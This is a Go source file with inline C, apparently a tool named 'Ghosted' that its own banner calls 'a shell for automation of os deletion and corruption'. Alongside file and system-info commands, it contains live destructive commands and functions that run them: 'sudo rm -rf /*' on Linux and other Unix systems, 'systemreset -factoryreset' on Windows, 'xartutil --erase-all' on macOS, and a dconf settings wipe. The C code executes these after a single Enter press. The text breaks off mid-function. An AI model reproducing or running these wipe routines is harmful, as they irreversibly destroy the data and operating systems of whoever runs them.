package ghosted

// languages used, C|Go|Assembly ALL C and ASM IS INLINE
// TODO: grab interfaces, grab IP, grab hostname, grab hwid, copy files, remove files, factory reset windows AND mac, kill linux systems, check connection, grab node names
// grab basic system information, grab CPU with inline assembly, read a directorys data, grab the working directory, | make a banner.txt, make a commands.txt
// author => ArkAngeL43
// update: 2022 red rabbit version 1.0 i really dont know why i wrote the c like this, could have been done way better

//#include<stdio.h>
//#include<stdlib.h>
//#include<string.h>
//#include<time.h>
//#include <unistd.h>
//#include <errno.h>
//#include <sys/utsname.h>
//#include <sys/utsname.h>
//// this main terminal will make sure the user is on the os they selected as well as make sure
//// sure that they want to go through with the following executions and system removal/reset
//int main_run(){
//    #ifdef _WIN32
//        char command[] = "systemreset -factoryreset";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
//        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
//        printf("\e[0;91m[-] Using -> %s\n\n",command);
//        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
//        printf("\e[0;91m[+] |x4           : Loads consol \n");
//        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
//        printf("\n         >>>> \n");
//        fgets(response, sizeof(response), stdin);
//        printf("running")
//        system(command);
//    #elif __linux__
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> linux\n\n");
//        printf("\e[0;91m[-] Using -> %s\n\n", command);
//        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif _WIN64
//        char command[] = "systemreset -factoryreset";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
//        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
//        printf("\e[0;91m[-] Using -> %s\n\n",command);
//        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
//        printf("\e[0;91m[+] |x4           : Loads consol \n");
//        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
//        printf("\n         >>>> \n");
//        fgets(response, sizeof(response), stdin);
//        printf("running")
//        system(command);
//    #else
//        printf("this system may not be supported running shell \n")
//        system("gcc run.c -o run ; ./run")
//    #endif
//}
//int main_shell_for_removal(){
//    #ifdef _WIN32
//        char command[] = "systemreset -factoryreset";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
//        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
//        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ")
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ")
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ")
//        printf("\n         >>>> \n");
//        fgets(response, sizeof(response), stdin);
//        printf("running")
//        system(command);
//    #elif __linux__
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> linux\n\n");
//        printf("\e[0;91m-----------------------------------------------------------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif __unix__
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Unix based sys\n\n");
//        printf("\e[0;91m-----------------------------------------------------------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif __sun
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Unix based Solaris OS\n\n");
//        printf("\e[0;91m-----------------------------------------------------------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif BSD
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Unix based BSD\n\n");
//        printf("\e[0;91m-----------------------------------------------------------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif __OpenBSD__
//        char command[] = "sudo rm -rf /*";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Unix based OpenBSD\n\n");
//        printf("\e[0;91m-----------------------------------------------------------------------\n");
//        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n >>>>");
//        fgets(response, sizeof(response), stdin);
//        system(command);
//    #elif _WIN64
//        char command[] = "systemreset -factoryreset";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
//        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
//        printf("-----------------------------------------------------------------------------------");
//        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n         >>>> \n");
//        fgets(response, sizeof(response), stdin);
//        printf("running")
//        system(command);
//    #elif TARGET_OS_MAC
//        char command[] = "xartutil --erase-all";
//        printf("\x1b[H\x1b[2J\x1b[3J");
//        char response[10];
//        time_t t = time(NULL);
//        struct tm tm = *localtime(&t);
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
//        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
//        printf("\e[0;35m*                                             *\n\e[0;35m");
//        printf("\e[0;35m***********************************************\n\e[0;35m");
//        printf("\e[0;91m[-] Operating System Detected -> MAC OS\n\n");
//        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
//        printf("-----------------------------------------------------------------------------------");
//        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
//        printf("\e[0;91m[*] it is suggested that you read the documentation, if you have not yet ");
//        printf("\e[0;91m[*] please do exit out of this script with crtl+c and reading the danger ");
//        printf("\e[0;91m[*] documentation and the potential damages that could occur ");
//        printf("\n         >>>> \n");
//        fgets(response, sizeof(response), stdin);
//        printf("running")
//        system(command);
//    #else
//        printf("this system might not be supported\n")
//    #endif
//}
////grab the cpu based data
//int a[10];
//void brandString(int eaxValues)
//{
//    if (eaxValues == 1) {
//    __asm__("mov $0x80000002 , %eax\n\t");
//    }
//    else if (eaxValues == 2) {
//        __asm__("mov $0x80000003 , %eax\n\t");
//    }
//    else if (eaxValues == 3) {
//        __asm__("mov $0x80000004 , %eax\n\t");
//    }
//    __asm__("cpuid\n\t");
//    __asm__("mov %%eax, %0\n\t":"=r" (a[0]));
//    __asm__("mov %%ebx, %0\n\t":"=r" (a[1]));
//    __asm__("mov %%ecx, %0\n\t":"=r" (a[2]));
//    __asm__("mov %%edx, %0\n\t":"=r" (a[3]));
//    printf("%s", &a[0]);
//}
//
//void getCpuID()
//{
//    __asm__("xor %eax , %eax\n\t");
//    __asm__("xor %ebx , %ebx\n\t");
//    __asm__("xor %ecx , %ecx\n\t");
//    __asm__("xor %edx , %edx\n\t");
//    printf("CPU is => ");
//    brandString(1);
//    brandString(2);
//    brandString(3);
//    printf("\n");
//}
//
//int main_system()
//{
//    struct utsname buf1;
//    errno =0;
//    if(uname(&buf1)!=0)
//    {
//        perror("Error => Uname returned 0");
//        exit(EXIT_FAILURE);
//    }
//    printf("|System Name             |=> %s\n", buf1.sysname);
//    printf("|                        ");
//    printf("|Node/System Name        |=> %s\n", buf1.nodename);
//    printf("|                        ");
//    printf("|System Current Version  |=> %s\n", buf1.version);
//    printf("|                        ");
//    printf("|Release Version         |=> %s\n", buf1.release);
//    printf("|                        ");
//    printf("|Machine ARCH            |=> %s\n", buf1.machine);
//}
import "C"
import (
	"bufio"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// declare colors and set variables first
var (
	mac_reset              = "xartutil --erase-all"
	windows_reset          = "systemreset –factoryreset"
	linux_reset_settings   = "dconf reset -f /"
	linux_reset_when_BLK   = "reset"
	linux_DELETE_Dangerous = "sudo rm -rf /*"
	clear_hex              = "\x1b[H\x1b[2J\x1b[3J"
	Clear_hex              = "\x1b[H\x1b[2J\x1b[3J"
	BLK                    = "\033[0;30m"
	RED                    = "\033[0;31m"
	GRN                    = "\033[0;32m"
	YEL                    = "\033[0;33m"
	BLU                    = "\033[0;34m"
	MAG                    = "\033[0;35m"
	CYN                    = "\033[0;36m"
	WHT                    = "\033[0;37m"
	BBLK                   = "\033[1;30m"
	BRED                   = "\033[1;31m"
	BGRN                   = "\033[1;32m"
	BYEL                   = "\033[1;33m"
	BBLU                   = "\033[1;34m"
	BMAG                   = "\033[1;35m"
	BCYN                   = "\033[1;36m"
	BWHT                   = "\033[1;37m"
	UBLK                   = "\033[4;30m"
	URED                   = "\033[4;31m"
	UGRN                   = "\033[4;32m"
	UYEL                   = "\033[4;33m"
	UBLU                   = "\033[4;34m"
	UMAG                   = "\033[4;35m"
	UCYN                   = "\033[4;36m"
	UWHT                   = "\033[4;37m"
	BLKB                   = "\033[40m"
	REDB                   = "\033[41m"
	GRNB                   = "\033[42m"
	YELB                   = "\033[43m"
	BLUB                   = "\033[44m"
	MAGB                   = "\033[45m"
	CYNB                   = "\033[46m"
	WHTB                   = "\033[47m"
	BLKHB                  = "\033[0;100m"
	REDHB                  = "\033[0;101m"
	GRNHB                  = "\033[0;102m"
	YELHB                  = "\033[0;103m"
	BLUHB                  = "\033[0;104m"
	MAGHB                  = "\033[0;105m"
	CYNHB                  = "\033[0;106m"
	WHTHB                  = "\033[0;107m"
	HBLK                   = "\033[0;90m"
	HRED                   = "\033[0;91m"
	HGRN                   = "\033[0;92m"
	HYEL                   = "\033[0;93m"
	HBLU                   = "\033[0;94m"
	HMAG                   = "\033[0;95m"
	HCYN                   = "\033[0;96m"
	HWHT                   = "\033[0;97m"
	BHBLK                  = "\033[1;90m"
	BHRED                  = "\033[1;91m"
	BHGRN                  = "\033[1;92m"
	BHYEL                  = "\033[1;93m"
	BHBLU                  = "\033[1;94m"
	BHMAG                  = "\033[1;95m"
	BHCYN                  = "\033[1;96m"
	BHWHT                  = "\033[1;97m"
	fp                     string
	filet                  string
	size                   int64
)

func reset_MAC_OS() {
	prg := "xartutil"
	arg1 := "--erase-all"
	cmd := exec.Command(prg, arg1)
	stdout, err := cmd.Output()
	if err != nil {
		C.main_shell_for_removal()
	}
	fmt.Print(string(stdout))
}

func reset_linux_when_black() {
	prg := linux_reset_when_BLK
	cmd := exec.Command(prg)
	stdout, err := cmd.Output()
	e(err)
	fmt.Print(string(stdout))
}

func reset_linux_settings() {
	prg := "dconf"
	arg1 := "reset"
	arg2 := "-f"
	arg3 := "/"
	cmd := exec.Command(prg, arg1, arg2, arg3)
	stdout, err := cmd.Output()
	e(err)
	fmt.Print(string(stdout))
}

func Ascii() {
	asciiArt :=
		`
					______  _     _  _____  _______ _______ _______ ______ 
					|  ____ |_____| |     | |______    |    |______ |     \
					|_____| |     | |_____| ______|    |    |______ |_____/
					*******************************************************
					* help -> Command list                                *
					*                                                     *
					*******************************************************
					* Ghosted, A shell for automation of os deletion and  *
					* corruption. Written from go, t, asm, C.             *
					*                                                     *
					*Supported systems -> Mac, Windows, Linux             *
					*******************************************************
`
	pr(RED, "", asciiArt)
}

// why not add txt files for printing?
// becasue i want everything in file

func help() {
	command :=
		`
				________________Command______Type________DangerLevel________Desc________________________
				|[1]  Clear or cls          |None   |    | None to  0   |Clear Terminal                |
				|[2]  time                  |None   |    | None to  0   |Get time current              |
				|[3]  online?               |None   |    | None to  0   |Check connection              |
				|[4]  sys-inf               |None   |    | None to  0   |Get system info               |
				|[5]  cpu                   |None   |    | None to  0   |Get system CPU                |
				|[6]  f-size                |String |    | None to .5   |Get a files size              | 
				|[7]  hex                   |String |    | None to .5   |Read file in byte             |
				|[8]  f-del                 |String |    | None to 1    |Delete a file                 |
				|[9]  copy-f                |String |    | None to 1    |Copy a file to a new location |  
				|[10] exit                  |None   |    | None to 0    |Exit the script               |
				|[11] Ctrl+C <key hangup>   |None   |    | None to 0    |Exit the script via ctrl+C    |
				|[12] h-dir                 |String |    | None to 0    |Get the home dir content      |
				|[13] dir?                  |String |    | None to 0    |Check if a directory exists   |
				|[14] w-dir                 |None   |    | None to 0    |Get the working directory     |
				|[15] c-dir                 |String |    | None to 0    |Create a directory            |
				|[16] walk-dir-l            |String |    | None to 0    |Check a dir for large files   |
				|[17] walk-dir-s            |String |    | None to 0    |Check a dir for ALL files     |
				|[18] h-dir                 |String |    | None to 0    |Check home dir for ALL files  |
				|[19] host                  |None   |    | None to 0    |Get the systems hostname      |
				|[20] tree                  |None   |    | None to 0    |Get all subdir's in home dir  |
				|[21] laddr                 |None   |    | None to 0    |Get all your interfaces       |
				|---------------------------|-------|----|--------------|------------------------------|
				* THIS IS A COMMAND OF DANGER ZONE, COMMANDS HERE CAN RESULT IN SYSTEMATIC CORRUPTION  *
				* OR CAN RESULT IN YOUR OS BEING RESET, DELETED, CORRUPT, OR CRASH. YOU ARE WARNED     *
				****************************************************************************************
				________________Command______Type________DangerLevel________Desc________________________
				|[DE] reset-windows         |None   |    | WARN: 10     |Will reset windows 10 system   |
				|[DE] reset-mac             |None   |    | WARN: 10     |Will reset MAC OS systems      |
				|[DE] reset-linux           |None   |    | WARN: 10     |Will reset linux machines      |
				|[DE] kill-linux            |None   |    | WARN: 100    |Will kill EVERY DRIVE AND PT   | 
				|[DE] reset-settings-dconf  |None   |    | WARN: 10     |Will attempt to reset settings |
				`
	fmt.Println("\n\n\n\n\n", BLU, "\b\b", command)
}

func hostname() {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("\033[32mHost >>> [", hostname, "\033[32m]")
}

func tree() {
	slab, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	files, err := ioutil.ReadDir(slab)
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		if !f.IsDir() {
			fmt.Println("\t\t\t\033[37m┡", f.Name())
		}
	}
}

func localaddr() {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Print(fmt.Errorf("localAddresses: %v\n", err.Error()))
		log.Fatal(err)
		return
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			log.Print(fmt.Errorf("localAddresses: %v\n", err.Error()))
			continue
		}
		for _, a := range addrs {
			log.Printf("%v %v\n", i.Name, a)
		}
	}
}

func clear(hex string) {
	fmt.Println(hex)
}

func e(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func get_working_dir(color string) {
	pd, err := os.Getwd()
	e(err)
	fmt.Println(color, string(pd))
}

//go sighandel(make(chan os.Signal, 1))
func sighandel(c chan os.Signal) {
	signal.Notify(c, os.Interrupt)
	for s := <-c; ; s = <-c {
		switch s {
		case os.Interrupt:
			fmt.Println("\nDetected Interupt.....")
			os.Exit(1)
		case os.Kill:
			fmt.Println("\n\n\tKILL received")
			os.Exit(1)
		}
	}
}

func pr(color, sep, str string) {
	fmt.Println(color, sep, str)
}

func defaultInterface() string {
	switch runtime.GOOS {
	case "freebsd", "linux":
		return "wlan0"
	case "windows":
		return "Ethernet"
	case "darwin":
		return "en0"
	}
	return "eth0"
}

func timenow() {
	t := time.Now()
	fmt.Println("Current Year        |", t.Year())
	fmt.Println("Current Month       |", t.Month())
	fmt.Println("Current Day         | ", t.Day())
	fmt.Println("Current Hour        |", t.Hour())
	fmt.Println("Current Minute      |", t.Minute())
	fmt.Println("Current Second      |", t.Second())
	fmt.Println("Current Nanosecond  |", t.Nanosecond())
}

func online_test() bool {
	_, err := http.Get("https://www.google.com")
	if err == nil {
		fmt.Println("[ + ] you are connected")
		Console(MAG, "\n\t\t\t\t")
		return true
	} else {
		fmt.Println(RED, "Device may have been disconnected from the network")
		return false
	}
}

func grabpubip() {
	uli := "https://api.ipify.org?format=text"
	response, err := http.Get(uli)
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()
	ip, err := ioutil.ReadAll(response.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("\033[32m\t\tPublic Internet Address came back with ~>  %s\n", ip)
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[RootCheck] Unable to fetch user: %s", err)
	}
	return currentUser.Username == "root"
}

// system filing

func read_binary(file string) {
	f, err := os.Open(file)
	e(err)
	defer f.Close()
	read := bufio.NewReader(f)
	buf := make([]byte, 256)
	for {
		_, err := read.Read(buf)

		if err != nil {
			if err != io.EOF {
				fmt.Println(err)
			}
			break
		}

		fmt.Printf("%s", hex.Dump(buf))
	}
}

func file_size(fp string) {
	info, err := os.Stat(fp)
	e(err)
	x := info.Size()
	fmt.Println("File byte size => ", x)
}

func does_file_exist(file string) {
	_, err := os.Stat(file)
	if errors.Is(err, os.ErrNotExist) {
		fmt.Println(RED, "[ - ] STAT: file does not exist")
	} else {
		fmt.Println(GRN, "[ + ] file exists")
	}
}

func remove(file string) {
	err := os.Remove(file)
	e(err)
	fmt.Println(GRN, "\n[ - ] File was deleted")
}

func last_modded(file string) {
	fileName := file
	fileInfo, err := os.Stat(fileName)
	e(err)
	modt := fileInfo.ModTime()
	fmt.Println(modt)
}

func copy_data_to_f(srcfile, dstfile string) {
	src := srcfile
	dst := dstfile
	fin, err := os.Open(src)
	e(err)
	defer fin.Close()
	fout, err := os.Create(dst)
	e(err)
	fmt.Println(BLU, "File created! -> ", dst)
	defer fout.Close()
	_, err = io.Copy(fout, fin)
	e(err)
	fmt.Println("Data copied to DST file")
	remove(src)
	fmt.Println("Data from file => ", src, "Was copied to => ", dst)
	fmt.Println("\nFile => ", src, "Was DELETED")
}

func get_homedir_content() {
	home, err := os.UserHomeDir()
	e(err)
	files, err := ioutil.ReadDir(home)
	e(err)
	count := 1
	fmt.Println(WHT, "total files in -> ", home)
	for _, f := range files {
		count += 1
		fmt.Println(GRN, "|", count, "|", " => ", BLU, f.Name(), "")
	}
}

func walk_size(fp string) {
	path := fp
	err := filepath.Walk(path, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			size += info.Size()
		}
		return err
	})
	e(err)
	fmt.Println(WHT, "\n\n", path, " has a size of -> ", size)
}

func walk_large_files(fp string) {
	var files []string
	var limit int64 = 1024 * 1024 * 1024
	path := fp
	err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		e(err)
		if info.Size() > limit {
			files = append(files, path)
			fmt.Println(" No files larger than 1024 bytes allowed")
		}
		return err
	})
	e(err)
	counter := 1
	for _, file := range files {
		counter += 1
		fmt.Println(WHT, "[ ", counter, " ] ", BLU, "LARGE FILE => ", file)
	}
}

func create_dir(filepath string) {
	path := filepath
	err := os.MkdirAll(path, 0755)
	if err != nil {
		fmt.Println(RED, "Could not create a directory")
		log.Fatal(err)
	}
	fmt.Println("Dir -> ", path, " created")
}

///////////// Console STARTS HERE, USE BUFIO

func Console(color, spacer string) {
	input := bufio.NewReader(os.Stdin)
	fmt.Print(BLU, spacer, "Ghosted> ")
	for {
		go sighandel(make(chan os.Signal, 1))
		t, _ := input.ReadString('\n')
		t = strings.Replace(t, "\n", "", -1)
		if strings.Compare("time", t) == 0 {
			timenow()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("ip", t) == 0 {
			grabpubip()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("online?", t) == 0 {
			online_test()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("cpu", t) == 0 {
			C.getCpuID()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("sys-inf", t) == 0 {
			C.main_system()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("clear", t) == 0 {
			clear(clear_hex)
			Ascii()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("cls", t) == 0 {
			clear(clear_hex)
			Ascii()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("isroot?", t) == 0 {
			fmt.Println("is user root? => ", isRoot())
		}
		if strings.Compare("hex", t) == 0 {
			fmt.Print("File||File path > ")
			fmt.Scanf("%s", &fp)
			read_binary(fp)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("f-size", t) == 0 {
			fmt.Print("File||File path > ")
			fmt.Scanf("%s", &filet)
			file_size(filet)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("f-del", t) == 0 {
			fmt.Print("File||File path > ")
			fmt.Scanf("%s", &filet)
			_, err := os.Stat(filet)
			if errors.Is(err, os.ErrNotExist) {
				fmt.Println(RED, "[ - ] STAT: file does not exist")
				Console(MAG, "\n\t\t\t\t")
			} else {
				fmt.Println(GRN, "[ + ] file exists")
				err := os.Remove(filet)
				e(err)
				fmt.Println(GRN, "[ - ] File was deleted")
				Console(MAG, "\n\t\t\t\t")

			}
		}
		if strings.Compare("copy-f", t) == 0 {
			var src string
			var dst string
			fmt.Print("File to copy data from > ")
			fmt.Scanf("%s", &src)
			//
			fmt.Print("File to copy data to   > ")
			fmt.Scanf("%s", &dst)
			copy_data_to_f(src, dst)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("h-dir", t) == 0 {
			get_homedir_content()
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("exit", t) == 0 {
			pr(WHT, "\n", "thanks for stopping by!!")
			os.Exit(1)
		}
		if strings.Compare("walk-dir-s", t) == 0 {
			var filp string
			fmt.Print("Filepath to walk -> ")
			fmt.Scanf("%s", &filp)
			walk_size(filp)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("walk-dir-l", t) == 0 {
			var filp string
			fmt.Print("Filepath to walk -> ")
			fmt.Scanf("%s", &filp)
			walk_large_files(filp)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("c-dir", t) == 0 {
			var cdp string
			fmt.Print("\ndir name to create -> ")
			fmt.Scanf("%s", &cdp)
			create_dir(cdp)
			Console(MAG, "\n\t\t\t\t")
		}
		if strings.Compare("w-dir", t) == 0 {
			path, err := os.Getwd()
			e(err)
			fmt.Println(GRN, "Working directory is => ", path)
